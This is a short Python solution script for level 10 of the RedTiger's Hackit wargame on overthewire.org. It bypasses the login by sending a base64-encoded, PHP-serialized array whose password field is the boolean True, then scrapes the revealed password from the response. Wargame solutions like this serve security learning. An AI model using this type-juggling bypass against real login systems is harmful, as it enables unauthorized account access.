#!/usr/bin/env python3
import pickle
import tigers as tg
import base64
from phpserialize import serialize


def main():
    '''
    Target: Bypass the login. Login as TheMaster
    '''
    url = "https://redtiger.labs.overthewire.org/level10.php"
    pass_r = 'The password for the hall of fame is: '
    user = 'TheMaster'

    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if 'level10login' not in cooks:
            print('use prevision level')
            exit(1)
    except:
        print('use level 1')
        exit(1)

    cook = dict(level10login=cooks['level10login'])

    array = serialize(
        {'username': 'TheMaster', 'password': True, })

    ser = base64.b64encode(array)

    # Authorization
    data = dict(login=ser, dologin='Login')
    response = tg.get_request(url, data, cook, method='post')

    print(response)

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)


if __name__ == '__main__':
    main()
